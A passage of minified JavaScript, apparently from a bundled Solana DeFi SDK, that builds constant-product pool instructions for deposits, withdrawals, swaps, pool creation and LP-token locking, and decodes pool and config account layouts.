        { pubkey: Bc, isSigner: !1, isWritable: !1 },
        { pubkey: Cc, isSigner: !1, isWritable: !1 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
      ],
      y = dt.alloc(m.span);
    return (
      yx.debug("cpmm deposit data", {
        lpAmount: f.toString(),
        amountMaxA: h.toString(),
        amountMaxB: p.toString(),
      }),
      m.encode({ lpAmount: f, amountMaxA: h, amountMaxB: p }, y),
      new vs({ keys: g, programId: t, data: dt.from([...wx.deposit, ...y]) })
    );
  }
  function Ax(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p) {
    let m = JT([zT("lpAmount"), zT("amountMinA"), zT("amountMinB")]),
      g = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: Bc, isSigner: !1, isWritable: !1 },
        { pubkey: Cc, isSigner: !1, isWritable: !1 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
        { pubkey: zI, isSigner: !1, isWritable: !1 },
      ],
      y = dt.alloc(m.span);
    return (
      m.encode({ lpAmount: f, amountMinA: h, amountMinB: p }, y),
      new vs({ keys: g, programId: t, data: dt.from([...wx.withdraw, ...y]) })
    );
  }
  function kx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m) {
    let g = JT([zT("amountIn"), zT("amounOutMin")]),
      y = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
      ],
      w = dt.alloc(g.span);
    return (
      g.encode({ amountIn: p, amounOutMin: m }, w),
      new vs({
        keys: y,
        programId: t,
        data: dt.from([...wx.swapBaseInput, ...w]),
      })
    );
  }
  function Ix(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m) {
    let g = JT([zT("amountInMax"), zT("amountOut")]),
      y = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
      ],
      w = dt.alloc(g.span);
    return (
      g.encode({ amountInMax: p, amountOut: m }, w),
      new vs({
        keys: y,
        programId: t,
        data: dt.from([...wx.swapBaseOutput, ...w]),
      })
    );
  }
  async function Sx(t) {
    var e;
    let n,
      {
        ownerInfo: r,
        poolInfo: o,
        poolKeys: i,
        feeNftOwner: s,
        getEphemeralSigners: a,
      } = t,
      u = [],
      [c, l] = [new Ji(o.id), new Ji(o.lpMint.address)];
    if (a) n = new Ji((await a(1))[0]);
    else {
      let t = Xu.generate();
      u.push(t), (n = t.publicKey);
    }
    let { publicKey: d } = y_(s, n, Bc),
      { publicKey: f } = SC(n),
      { publicKey: h } = gx(t.lockProgram, n),
      { publicKey: p } = y_(r.wallet, l, Bc),
      { publicKey: m } = y_(t.lockAuthProgram, l, Bc),
      g = (function ({
        programId: t,
        auth: e,
        payer: n,
        liquidityOwner: r,
        nftOwner: o,
        nftMint: i,
        nftAccount: s,
        poolId: a,
        lockPda: u,
        mintLp: c,
        userLpVault: l,
        lockLpVault: d,
        poolVaultA: f,
        poolVaultB: h,
        metadataAccount: p,
        lpAmount: m,
        withMetadata: g,
      }) {
        let y = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !0, isWritable: !1 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: i, isSigner: !0, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !1 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Ec, isSigner: !1, isWritable: !1 },
            { pubkey: FI, isSigner: !1, isWritable: !1 },
          ],
          w = JT([zT("lpAmount"), GT("withMetadata")]),
          b = dt.alloc(w.span);
        w.encode({ lpAmount: m, withMetadata: g }, b);
        let v = dt.from([...wx.lockCpLiquidity, ...b]);
        return new vs({ keys: y, programId: t, data: v });
      })({
        programId: t.lockProgram,
        auth: t.lockAuthProgram,
        payer: r.feePayer,
        liquidityOwner: r.wallet,
        nftOwner: s,
        nftMint: n,
        nftAccount: d,
        poolId: c,
        lockPda: h,
        mintLp: l,
        userLpVault: p,
        lockLpVault: m,
        poolVaultA: new Ji(i.vault.A),
        poolVaultB: new Ji(i.vault.B),
        metadataAccount: f,
        lpAmount: t.lpAmount,
        withMetadata: null == (e = t.withMetadata) || e,
      });
    return {
      address: {
        nftMint: n,
        nftAccount: d,
        metadataAccount: f,
        lockPda: h,
        userLpVault: p,
        lockLpVault: m,
      },
      instructions: [g],
      signers: u,
      instructionTypes: [o_],
      lookupTableAddress: [],
    };
  }
  function _x({
    programId: t,
    nftOwner: e,
    auth: n,
    nftAccount: r,
    lockPda: o,
    poolId: i,
    mintLp: s,
    userVaultA: a,
    userVaultB: u,
    poolVaultA: c,
    poolVaultB: l,
    mintA: d,
    mintB: f,
    lockLpVault: h,
    lpFeeAmount: p,
    cpmmProgram: m,
    cpmmAuthProgram: g,
  }) {
    let y = [
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: null != m ? m : M_, isSigner: !1, isWritable: !1 },
        { pubkey: null != g ? g : L_, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
        { pubkey: Bc, isSigner: !1, isWritable: !1 },
        { pubkey: Cc, isSigner: !1, isWritable: !1 },
        { pubkey: zI, isSigner: !1, isWritable: !1 },
      ],
      w = JT([zT("lpFeeAmount")]),
      b = dt.alloc(w.span);
    w.encode({ lpFeeAmount: p }, b);
    let v = dt.from([...wx.collectCpFee, ...b]);
    return new vs({ keys: y, programId: t, data: v });
  }
  var Tx = JT([
      RT(8),
      UT("bump"),
      GT("disableCreatePool"),
      CT("index"),
      zT("tradeFeeRate"),
      zT("protocolFeeRate"),
      zT("fundFeeRate"),
      zT("createPoolFee"),
      jT("protocolOwner"),
      jT("fundOwner"),
      YT(zT(), 16),
    ]),
    Bx = JT([
      RT(8),
      jT("configId"),
      jT("poolCreator"),
      jT("vaultA"),
      jT("vaultB"),
      jT("mintLp"),
      jT("mintA"),
      jT("mintB"),
      jT("mintProgramA"),
      jT("mintProgramB"),
      jT("observationId"),
      UT("bump"),
      UT("status"),
      UT("lpDecimals"),
      UT("mintDecimalA"),
      UT("mintDecimalB"),
      zT("lpAmount"),
      zT("protocolFeesMintA"),
      zT("protocolFeesMintB"),
      zT("fundFeesMintA"),
      zT("fundFeesMintB"),
      zT("openTime"),
      YT(zT(), 32),
    ]),
    Cx = class extends cT {
      constructor(t) {
        super(t);
      }
      async load() {
        this.checkDisabled();
      }
      async getCpmmPoolKeys(t) {
        return (await this.scope.api.fetchPoolKeysById({ idList: [t] }))[0];
      }
      async getRpcPoolInfo(t, e) {
        return (await this.getRpcPoolInfos([t], e))[t];
      }
      async getRpcPoolInfos(t, e) {
        let n = await MA(
            this.scope.connection,
            t.map((t) => ({ pubkey: new Ji(t) }))
          ),
          r = {},
          o = new Set(),
          i = [];
        for (let l = 0; l < t.length; l++) {
          let e = n[l];
          if (null === e.accountInfo)
            throw Error("fetch pool info error: " + String(t[l]));
          let s = Bx.decode(e.accountInfo.data);
          (r[String(t[l])] = _A(SA({}, s), { programId: e.accountInfo.owner })),
            o.add(String(s.configId)),
            i.push(s.vaultA, s.vaultB);
        }
        let s = {};
        if (e) {
          let t = [...o],
            e = await MA(
              this.scope.connection,
              t.map((t) => ({ pubkey: new Ji(t) }))
            );
          for (let n = 0; n < t.length; n++) {
            let r = e[n].accountInfo;
            if (null === r) throw Error("fetch pool config error: " + t[n]);
            s[t[n]] = Tx.decode(r.data);
          }
        }
        let a = {},
          u = await MA(
            this.scope.connection,
            i.map((t) => ({ pubkey: new Ji(t) }))
          );
        for (let l = 0; l < i.length; l++) {
          let t = u[l].accountInfo;
          if (null === t) throw Error("fetch vault info error: " + i[l]);
          a[String(i[l])] = new Yn($c.decode(t.data).amount.toString());
        }
        let c = {};
        for (let [l, d] of Object.entries(r)) {
          let t = a[d.vaultA.toString()]
              .sub(d.protocolFeesMintA)
              .sub(d.fundFeesMintA),
            e = a[d.vaultB.toString()]
              .sub(d.protocolFeesMintB)
              .sub(d.fundFeesMintB);
          c[l] = _A(SA({}, d), {
            baseReserve: t,
            quoteReserve: e,
            vaultAAmount: a[d.vaultA.toString()],
            vaultBAmount: a[d.vaultB.toString()],
            configInfo: s[d.configId.toString()],
            poolPrice: new bI(e.toString())
              .div(new bI(10).pow(d.mintDecimalB))
              .div(new bI(t.toString()).div(new bI(10).pow(d.mintDecimalA))),
          });
        }
        return c;
      }
      toComputePoolInfos({ pools: t, mintInfos: e }) {
        return Object.keys(t).reduce((n, r) => {
          var o, i, s, a;
          let u = t[r],
            [c, l] = [u.mintA.toBase58(), u.mintB.toBase58()];
          return _A(SA({}, n), {
            [r]: _A(SA({}, u), {
              id: new Ji(r),
              configInfo: u.configInfo,
              version: 7,
              authority: lx(u.programId).publicKey,
              mintA: fE({
                address: c,
                decimals: u.mintDecimalA,
                programId: u.mintProgramA.toBase58(),
                extensions: {
                  feeConfig:
                    null != (o = e[c]) && o.feeConfig
                      ? hE(null == (i = e[c]) ? void 0 : i.feeConfig)
                      : void 0,
                },
              }),
              mintB: fE({
                address: l,
                decimals: u.mintDecimalB,
                programId: u.mintProgramB.toBase58(),
                extensions: {
                  feeConfig:
                    null != (s = e[l]) && s.feeConfig
                      ? hE(null == (a = e[l]) ? void 0 : a.feeConfig)
                      : void 0,
                },
              }),
            }),
          });
        }, {});
      }
      async getPoolInfoFromRpc(t) {
        let e = await this.getRpcPoolInfo(t, !0),
          n = await DA({
            connection: this.scope.connection,
            mints: [e.mintA, e.mintB],
          }),
          r = fE({
            address: e.mintA.toBase58(),
            decimals: e.mintDecimalA,
            programId: e.mintProgramA.toBase58(),
            extensions: {
              feeConfig: n[e.mintA.toBase58()].feeConfig
                ? hE(n[e.mintA.toBase58()].feeConfig)
                : void 0,
            },
          }),
          o = fE({
            address: e.mintB.toBase58(),
            decimals: e.mintDecimalB,
            programId: e.mintProgramB.toBase58(),
            extensions: {
              feeConfig: n[e.mintB.toBase58()].feeConfig
                ? hE(n[e.mintB.toBase58()].feeConfig)
                : void 0,
            },
          }),
          i = fE({
            address: e.mintLp.toBase58(),
            decimals: e.lpDecimals,
            programId: Bc.toBase58(),
          }),
          s = {
            id: e.configId.toBase58(),
            index: e.configInfo.index,
            protocolFeeRate: e.configInfo.protocolFeeRate.toNumber(),
            tradeFeeRate: e.configInfo.tradeFeeRate.toNumber(),
            fundFeeRate: e.configInfo.fundFeeRate.toNumber(),
            createPoolFee: e.configInfo.createPoolFee.toString(),
          },
          a = {
            volume: 0,
            volumeQuote: 0,
            volumeFee: 0,
            apr: 0,
            feeApr: 0,
            priceMin: 0,
            priceMax: 0,
            rewardApr: [],
          };
        return {
          poolInfo: {
            programId: e.programId.toBase58(),
            id: t,
            type: "Standard",
            lpMint: i,
            lpPrice: 0,
            lpAmount: e.lpAmount.toNumber(),
            config: s,
            mintA: r,
            mintB: o,
            rewardDefaultInfos: [],
            rewardDefaultPoolInfos: "Ecosystem",
            price: e.poolPrice.toNumber(),
            mintAmountA: new bI(e.vaultAAmount.toString())
              .div(10 ** r.decimals)
              .toNumber(),
            mintAmountB: new bI(e.vaultBAmount.toString())
              .div(10 ** o.decimals)
              .toNumber(),
            feeRate: e.configInfo.tradeFeeRate.toNumber(),
            openTime: e.openTime.toString(),
            tvl: 0,
            burnPercent: 0,
            day: a,
            week: a,
            month: a,
            pooltype: [],
            farmUpcomingCount: 0,
            farmOngoingCount: 0,
            farmFinishedCount: 0,
          },
          poolKeys: {
            programId: e.programId.toBase58(),
            id: t,
            mintA: r,
            mintB: o,
            openTime: e.openTime.toString(),
            vault: { A: e.vaultA.toBase58(), B: e.vaultB.toBase58() },
            authority: lx(e.programId).publicKey.toBase58(),
            mintLp: i,
            config: s,
            observationId: hx(e.programId, new Ji(t)).publicKey.toBase58(),
          },
          rpcData: e,
        };
      }
      async createPool(t) {
        var e,
          n,
          r,
          o = t,
          {
            poolId: i,
            programId: s,
            poolFeeAccount: a,
            startTime: u,
            ownerInfo: c,
            associatedOnly: l = !1,
            checkCreateATAOwner: d = !1,
            txVersion: f,
            feeConfig: h,
            computeBudgetConfig: p,
            txTipConfig: m,
            feePayer: g,
          } = o,
          y = TA(o, [
            "poolId",
            "programId",
            "poolFeeAccount",
            "startTime",
            "ownerInfo",
            "associatedOnly",
            "checkCreateATAOwner",
            "txVersion",
            "feeConfig",
            "computeBudgetConfig",
            "txTipConfig",
            "feePayer",
          ]);
        let w =
            c.feePayer ||
            (null == (e = this.scope.owner) ? void 0 : e.publicKey),
          b = new Yn(new Ji(y.mintA.address).toBuffer()).lte(
            new Yn(new Ji(y.mintB.address).toBuffer())
          ),
          [v, A] = b ? [y.mintA, y.mintB] : [y.mintB, y.mintA],
          [k, I] = b
            ? [y.mintAAmount, y.mintBAmount]
            : [y.mintBAmount, y.mintAAmount],
          S = c.useSOLBalance && v.address === xc.toBase58(),
          _ = c.useSOLBalance && A.address === xc.toBase58(),
          [T, B] = [new Ji(v.address), new Ji(A.address)],
          C = this.createTxBuilder(g),
          { account: E, instructionParams: x } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: T,
              tokenProgram: v.programId,
              owner: this.scope.ownerPubKey,
              createInfo: S ? { payer: w, amount: k } : void 0,
              notUseTokenAccount: S,
              skipCloseAccount: !S,
              associatedOnly: !S && l,
              checkCreateATAOwner: d,
            });
        C.addInstruction(x || {});
        let { account: P, instructionParams: O } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: new Ji(A.address),
            tokenProgram: A.programId,
            owner: this.scope.ownerPubKey,
            createInfo: _ ? { payer: w, amount: I } : void 0,
            notUseTokenAccount: _,
            skipCloseAccount: !_,
            associatedOnly: !_ && l,
            checkCreateATAOwner: d,
          });
        if ((C.addInstruction(O || {}), void 0 === E || void 0 === P))
          throw Error("you don't has some token account");
        let R = px({
          poolId: i,
          programId: s,
          configId: new Ji(h.id),
          mintA: T,
          mintB: B,
        });
        return (
          C.addInstruction({
            instructions: [
              bx(
                s,
                this.scope.ownerPubKey,
                new Ji(h.id),
                R.authority,
                R.poolId,
                T,
                B,
                R.lpMint,
                E,
                P,
                y_(this.scope.ownerPubKey, R.lpMint).publicKey,
                R.vaultA,
                R.vaultB,
                a,
                new Ji(null != (n = v.programId) ? n : Bc),
                new Ji(null != (r = A.programId) ? r : Bc),
                R.observationId,
                k,
                I,
                u
              ),
            ],
            instructionTypes: [$S],
          }),
          C.addCustomComputeBudget(p),
          C.addTipInstruction(m),
          C.versionBuild({
            txVersion: f,
            extInfo: {
              address: _A(SA({}, R), {
                mintA: v,
                mintB: A,
                programId: s,
                poolFeeAccount: a,
                feeConfig: h,
              }),
            },
          })
        );
      }
      async addLiquidity(t) {
        let {
          poolInfo: e,
          poolKeys: n,
          inputAmount: r,
          baseIn: o,
          slippage: i,
          computeResult: s,
          computeBudgetConfig: a,
          txTipConfig: u,
          config: c,
          txVersion: l,
          feePayer: d,
        } = t;
        !1 === this.scope.availability.addStandardPosition &&
          this.logAndCreateError(
            "add liquidity feature disabled in your region"
          ),
          r.isZero() &&
            this.logAndCreateError(
              "amounts must greater than zero",
              "amountInA",
              { amountInA: r.toString() }
            );
        let { account: f } = this.scope,
          { bypassAssociatedCheck: h, checkCreateATAOwner: p } = SA(
            { bypassAssociatedCheck: !1, checkCreateATAOwner: !1 },
            c
          ),
          m = s ? void 0 : await this.getRpcPoolInfo(e.id),
          {
            liquidity: g,
            inputAmountFee: y,
            anotherAmount: w,
          } = s ||
          this.computePairAmount({
            poolInfo: _A(SA({}, e), {
              lpAmount: new bI(m.lpAmount.toString())
                .div(10 ** e.lpMint.decimals)
                .toNumber(),
            }),
            baseReserve: m.baseReserve,
            quoteReserve: m.quoteReserve,
            slippage: new QI(0),
            baseIn: o,
            epochInfo: await this.scope.fetchEpochInfo(),
            amount: new bI(r.toString()).div(
              10 ** (o ? e.mintA.decimals : e.mintB.decimals)
            ),
          }),
          b = w.amount,
          v = e.mintA.address === xc.toString(),
          A = e.mintB.address === xc.toString(),
          k = this.createTxBuilder(d),
          [I, S] = [new Ji(e.mintA.address), new Ji(e.mintB.address)],
          { account: _, instructionParams: T } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: e.mintA.programId,
              mint: new Ji(e.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo:
                v || (o ? r : b).isZero()
                  ? { payer: this.scope.ownerPubKey, amount: o ? r : b }
                  : void 0,
              skipCloseAccount: !v,
              notUseTokenAccount: v,
              associatedOnly: !1,
              checkCreateATAOwner: p,
            });
        k.addInstruction(T || {});
        let { account: B, instructionParams: C } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: e.mintB.programId,
            mint: new Ji(e.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              A || (o ? b : r).isZero()
                ? { payer: this.scope.ownerPubKey, amount: o ? b : r }
                : void 0,
            skipCloseAccount: !A,
            notUseTokenAccount: A,
            associatedOnly: !1,
            checkCreateATAOwner: p,
          });
        k.addInstruction(C || {}),
          !_ &&
            !B &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              f.tokenAccounts
            );
        let E = await f.getCreatedTokenAccount({
            mint: new Ji(e.lpMint.address),
          }),
          x = await f.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: new Ji(e.lpMint.address),
            tokenAccount: E,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: P } = x,
          O = TA(x, ["tokenAccount"]);
        k.addInstruction(O);
        let R = null != n ? n : await this.getCpmmPoolKeys(e.id),
          M = new QI(new Yn(1)).sub(i);
        return (
          k.addInstruction({
            instructions: [
              vx(
                new Ji(e.programId),
                this.scope.ownerPubKey,
                new Ji(R.authority),
                new Ji(e.id),
                P,
                _,
                B,
                new Ji(R.vault.A),
                new Ji(R.vault.B),
                I,
                S,
                new Ji(e.lpMint.address),
                s ? (null == s ? void 0 : s.liquidity) : M.mul(g).quotient,
                o ? y.amount : b,
                o ? b : y.amount
              ),
            ],
            instructionTypes: [t_],
            lookupTableAddress: R.lookupTableAccount
              ? [R.lookupTableAccount]
              : [],
          }),
          k.addCustomComputeBudget(a),
          k.addTipInstruction(u),
          k.versionBuild({ txVersion: l })
        );
      }
      async withdrawLiquidity(t) {
        var e, n;
        let {
          poolInfo: r,
          poolKeys: o,
          lpAmount: i,
          slippage: s,
          computeBudgetConfig: a,
          txTipConfig: u,
          txVersion: c,
          feePayer: l,
          closeWsol: d = !0,
        } = t;
        !1 === this.scope.availability.addStandardPosition &&
          this.logAndCreateError(
            "add liquidity feature disabled in your region"
          );
        let f,
          h,
          p = new QI(new Yn(1)).sub(s),
          m = await this.getRpcPoolInfo(r.id),
          [g, y] = [
            p.mul(i.mul(m.baseReserve).div(m.lpAmount)).quotient,
            p.mul(i.mul(m.quoteReserve).div(m.lpAmount)).quotient,
          ],
          w = await this.scope.fetchEpochInfo(),
          [b, v] = [
            K_(g, r.mintA.extensions.feeConfig, w, !1),
            K_(y, r.mintB.extensions.feeConfig, w, !1),
          ],
          { account: A } = this.scope,
          k = this.createTxBuilder(l),
          [I, S] = [new Ji(r.mintA.address), new Ji(r.mintB.address)],
          _ = I.equals(GI),
          T = S.equals(GI),
          { account: B, instructionParams: C } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: r.mintA.programId,
              mint: new Ji(r.mintA.address),
              notUseTokenAccount: _,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !(_ && d),
              associatedOnly: !_,
              checkCreateATAOwner: !1,
            });
        (f = B), C && k.addInstruction(C);
        let { account: E, instructionParams: x } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: r.mintB.programId,
            mint: new Ji(r.mintB.address),
            notUseTokenAccount: T,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !(T && d),
            associatedOnly: !T,
            checkCreateATAOwner: !1,
          });
        (h = E),
          x && k.addInstruction(x),
          (!f || !h) &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              A.tokenAccounts
            );
        let P = await A.getCreatedTokenAccount({
          mint: new Ji(r.lpMint.address),
        });
        P ||
          this.logAndCreateError(
            "cannot found lp token account",
            "tokenAccounts",
            A.tokenAccounts
          );
        let O = null != o ? o : await this.getCpmmPoolKeys(r.id);
        return (
          k.addInstruction({
            instructions: [
              Ax(
                new Ji(r.programId),
                this.scope.ownerPubKey,
                new Ji(O.authority),
                new Ji(r.id),
                P,
                f,
                h,
                new Ji(O.vault.A),
                new Ji(O.vault.B),
                I,
                S,
                new Ji(r.lpMint.address),
                i,
                g.sub(null != (e = b.fee) ? e : new Yn(0)),
                y.sub(null != (n = v.fee) ? n : new Yn(0))
              ),
            ],
            instructionTypes: [e_],
            lookupTableAddress: O.lookupTableAccount
              ? [O.lookupTableAccount]
              : [],
          }),
          k.addCustomComputeBudget(a),
          k.addTipInstruction(u),
          k.versionBuild({ txVersion: c })
        );
      }
      async swap(t) {
        var e, n, r, o, i, s;
        let {
            poolInfo: a,
            poolKeys: u,
            baseIn: c,
            fixedOut: l,
            inputAmount: d,
            swapResult: f,
            slippage: h = 0,
            config: p,
            computeBudgetConfig: m,
            txTipConfig: g,
            txVersion: y,
            feePayer: w,
          } = t,
          {
            bypassAssociatedCheck: b,
            checkCreateATAOwner: v,
            associatedOnly: A,
          } = SA(
            {
              bypassAssociatedCheck: !1,
              checkCreateATAOwner: !1,
              associatedOnly: !0,
            },
            p
          ),
          k = this.createTxBuilder(w),
          [I, S] = [new Ji(a.mintA.address), new Ji(a.mintB.address)];
        l
          ? (f.sourceAmountSwapped = f.sourceAmountSwapped
              .mul(new Yn(1e4 * (1 + h)))
              .div(new Yn(1e4)))
          : (f.destinationAmountSwapped = f.destinationAmountSwapped
              .mul(new Yn(1e4 * (1 - h)))
              .div(new Yn(1e4)));
        let _ = a.mintA.address === GI.toBase58(),
          T = a.mintB.address === GI.toBase58(),
          { account: B, instructionParams: C } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: I,
              tokenProgram: new Ji(null != (e = a.mintA.programId) ? e : Bc),
              owner: this.scope.ownerPubKey,
              createInfo:
                _ || !c
                  ? {
                      payer: this.scope.ownerPubKey,
                      amount: c ? f.sourceAmountSwapped : 0,
                    }
                  : void 0,
              notUseTokenAccount: _,
              skipCloseAccount: !_,
              associatedOnly: !_ && A,
              checkCreateATAOwner: v,
            });
        C && k.addInstruction(C);
        let { account: E, instructionParams: x } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: S,
            tokenProgram: new Ji(null != (n = a.mintB.programId) ? n : Bc),
            owner: this.scope.ownerPubKey,
            createInfo:
              T || c
                ? {
                    payer: this.scope.ownerPubKey,
                    amount: c ? 0 : f.sourceAmountSwapped,
                  }
                : void 0,
            notUseTokenAccount: T,
            skipCloseAccount: !T,
            associatedOnly: !T && A,
            checkCreateATAOwner: v,
          });
        x && k.addInstruction(x),
          (!B || !E) &&
            this.logAndCreateError("user do not have token account", {
              mintA: a.mintA.symbol || a.mintA.address,
              mintB: a.mintB.symbol || a.mintB.address,
              mintATokenAcc: B,
              mintBTokenAcc: E,
              mintAUseSOLBalance: _,
              mintBUseSOLBalance: T,
              associatedOnly: A,
            });
        let P = null != u ? u : await this.getCpmmPoolKeys(a.id);
        return (
          k.addInstruction({
            instructions: [
              l
                ? Ix(
                    new Ji(a.programId),
                    this.scope.ownerPubKey,
                    new Ji(P.authority),
                    new Ji(P.config.id),
                    new Ji(a.id),
                    c ? B : E,
                    c ? E : B,
                    new Ji(P.vault[c ? "A" : "B"]),
                    new Ji(P.vault[c ? "B" : "A"]),
                    new Ji(
                      null != (i = a[c ? "mintA" : "mintB"].programId) ? i : Bc
                    ),
                    new Ji(
                      null != (s = a[c ? "mintB" : "mintA"].programId) ? s : Bc
                    ),
                    c ? I : S,
                    c ? S : I,
                    hx(new Ji(a.programId), new Ji(a.id)).publicKey,
                    f.sourceAmountSwapped,
                    f.destinationAmountSwapped
                  )
                : kx(
                    new Ji(a.programId),
                    this.scope.ownerPubKey,
                    new Ji(P.authority),
                    new Ji(P.config.id),
                    new Ji(a.id),
                    c ? B : E,
                    c ? E : B,
                    new Ji(P.vault[c ? "A" : "B"]),
                    new Ji(P.vault[c ? "B" : "A"]),
                    new Ji(
                      null != (r = a[c ? "mintA" : "mintB"].programId) ? r : Bc
                    ),
                    new Ji(
                      null != (o = a[c ? "mintB" : "mintA"].programId) ? o : Bc
                    ),
                    c ? I : S,
                    c ? S : I,
                    hx(new Ji(a.programId), new Ji(a.id)).publicKey,
                    d,
                    f.destinationAmountSwapped
                  ),
            ],
            instructionTypes: [l ? r_ : TS],
          }),
          k.addCustomComputeBudget(m),
          k.addTipInstruction(g),
          k.versionBuild({ txVersion: y })
        );
      }
      async lockLp(t) {
        var e, n, r, o, i;
        let {
          poolInfo: s,
          lpAmount: a,
          computeBudgetConfig: u,
          txTipConfig: c,
          txVersion: l,
          feePayer: d,
          feeNftOwner: f,
        } = t;
        a.isZero() &&
          this.logAndCreateError("lpAmount must greater than zero", {
            lpAmount: a.toString(),
          });
        let h = this.createTxBuilder(d),
          p = null != (e = t.poolKeys) ? e : await this.getCpmmPoolKeys(s.id),
          m = await Sx({
            poolInfo: s,
            poolKeys: p,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              feePayer: null != (n = t.feePayer) ? n : this.scope.ownerPubKey,
            },
            feeNftOwner: null != f ? f : this.scope.ownerPubKey,
            lockProgram: null != (r = t.programId) ? r : N_,
            lockAuthProgram: null != (o = t.authProgram) ? o : D_,
            lpAmount: a,
            withMetadata: null == (i = t.withMetadata) || i,
            getEphemeralSigners: t.getEphemeralSigners,
          });
        return (
          h.addInstruction(m),
          h.addCustomComputeBudget(u),
          h.addTipInstruction(c),
          h.versionBuild({ txVersion: l, extInfo: m.address })
        );
      }
      async harvestLockLp(t) {
        var e;
        let {
          poolInfo: n,
          lpFeeAmount: r,
          nftMint: o,
          programId: i = N_,
          authProgram: s = D_,
          cpmmProgram: a,
          computeBudgetConfig: u,
          txTipConfig: c,
          txVersion: l,
          closeWsol: d = !0,
        } = t;
        r.isZero() &&
          this.logAndCreateError("lpFeeAmount must greater than zero", {
            lpAmount: r.toString(),
          });
        let f,
          h,
          p = t.feePayer || this.scope.ownerPubKey,
          m = this.createTxBuilder(p),
          [g, y] = [new Ji(n.mintA.address), new Ji(n.mintB.address)],
          w = g.equals(GI),
          b = y.equals(GI),
          { account: v, instructionParams: A } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: n.mintA.programId,
              mint: new Ji(n.mintA.address),
              notUseTokenAccount: w,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
